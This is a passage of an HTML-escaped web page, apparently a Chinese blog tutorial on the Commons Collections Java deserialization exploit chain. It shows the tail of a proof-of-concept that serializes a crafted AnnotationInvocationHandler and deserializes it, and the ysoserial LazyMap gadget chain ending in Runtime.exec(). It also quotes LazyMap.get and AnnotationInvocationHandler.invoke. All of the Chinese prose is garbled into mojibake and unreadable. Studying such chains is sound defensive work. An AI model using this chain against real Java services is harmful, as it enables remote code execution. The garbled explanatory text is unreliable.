&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;oss&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;barr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;0x03-lazymapé“¾åˆ†æ&#34;&gt;0x03 LazyMapé“¾åˆ†æ&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬ä¸Šé¢äº†è§£åˆ°äº†TransformedMapé“¾çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œåœ¨&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;ysoserial&lt;/a&gt;é‡Œé¢ç”¨çš„æ˜¯LazyMapçš„é“¾ï¼Œè¿™ä¸ªä¼šç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä½†æ•´ä½“å’ŒTransformedMapå·®ä¸å¤šï¼Œæ•´æ¡é“¾å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Gadget chain:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		ObjectInputStream.readObject()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			AnnotationInvocationHandler.readObject()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				Map(Proxy).entrySet()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;					AnnotationInvocationHandler.invoke()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;						LazyMap.get()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;							ChainedTransformer.transform()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;								ConstantTransformer.transform()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;								InvokerTransformer.transform()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;									Method.invoke()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;										Class.getMethod()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;								InvokerTransformer.transform()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;									Method.invoke()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;										Runtime.getRuntime()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;								InvokerTransformer.transform()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;									Method.invoke()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;										Runtime.exec()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶å®åœ¨TransformedMapåˆ©ç”¨èµ·æ¥æ„Ÿè§‰ä¼šæ–¹ä¾¿å¾ˆå¤šå› ä¸ºå¯ä»¥ç›´æ¥åˆ©ç”¨AnnotationInvocationHandlerå¯¹è±¡çš„setValueæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚ä½†æ˜¯LazyMapä¹Ÿæ˜¯ä¸€æ ·ç”¨åˆ°transformçš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å…·ä½“ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°containsKeyæ˜¯ä¸å«è¯¥é”®åå°±æ‰§è¡Œfactoryçš„transformçš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// create value for key if key is not currently in the map
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;containsKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†æ˜¯æ²¡æœ‰èƒ½åœ¨LazyMapæ‰¾åˆ°ä¸€ä¸ªcheckSetValueçš„æ–¹æ³•ç„¶åå»æ‰§è¡ŒsetValueï¼Œè€Œä¸”åœ¨readObjectä¹Ÿæ²¡æœ‰è°ƒç”¨åˆ°getçš„æ–¹æ³•ã€‚æ‰€ä»¥æŒ‰ç…§ysoserialçš„ç”¨æ³•ï¼Œå°±æ‰¾åˆ°å¦å¤–ä¸€æ¡è·¯ï¼Œä¹Ÿå°±æ˜¯AnnotationInvocationHandlerç±»çš„invokeæ–¹æ³•æœ‰è°ƒç”¨åˆ°getï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;member&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&amp;gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramTypes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getParameterTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// Handle Object and Annotation methods
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;member&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;equals&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paramTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;paramTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;equalsImpl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;paramTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AssertionError&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Too many parameters for an annotation method&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;member&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;toString&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;toStringImpl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;hashCode&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashCodeImpl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;annotationType&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// Handle annotation member accessors
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memberValues&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;member&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//åœ¨è¿™é‡Œç”¨åˆ°äº†getçš„æ–¹æ³•
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IncompleteAnnotationException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;member&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExceptionProxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ExceptionProxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;generateException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLength&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cloneArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆåˆå¦‚ä½•èƒ½è°ƒç”¨åˆ° AnnotationInvocationHandler#invoke å‘¢?ysoserialçš„ä½œè€…æƒ³åˆ°çš„æ˜¯åˆ©ç”¨Java çš„å¯¹è±¡ä»£ç†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœå¯¹åŠ¨æ€ä»£ç†æœ‰ä¸ç†Ÿæ‚‰å¯ä»¥çœ‹ä¸‹bç«™çš„è§†é¢‘&lt;a href=&#34;https://www.bilibili.com/video/BV1M54y1X78p/?spm_id_from=333.337.search-card.all.click&amp;amp;vd_source=ba06a90e1fa2cd97f3dca910bb39ce20&#34;&gt;ä¸¤ä¸ªå°æ—¶å¸¦ä½ æ·±å…¥å‰–æä»£ç†æ¨¡å¼&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç”±æ­¤å¯çŸ¥AnnotationInvocationHandleræœ¬èº«å°±æ˜¯ä¸€ä¸ªInvocationHandlerï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨ååºåˆ—åŒ–è°ƒç”¨readObjectçš„æ—¶å€™è¦æ˜¯ä½¿ç”¨åˆ°äº†ä»£ç†å°±ä¼šè§¦å‘é‡Œé¢çš„invokeæ–¹æ³•ï¼Œæ¥ç€å°±èƒ½è¿›å…¥æˆ‘ä»¬çš„æ‰€éœ€çš„get æ–¹æ³•ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬åªè¦æŠŠLazyMapæ›¿æ¢æ‰TransformedMapå³å¯ï¼Œå¯ä»¥çœ‹åˆ°å®ƒçš„æ„é€ æ–¹æ³•ä¹Ÿæ˜¯protectedå±æ€§ï¼Œä¸è¿‡ä¹Ÿæä¾›äº†decorateæ–¹æ³•æ¥ç»™æˆ‘ä»¬åˆ›å»ºå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ›¿æ¢ä¸€ä¸‹åå­—å³å¯ã€‚&lt;/p&gt;
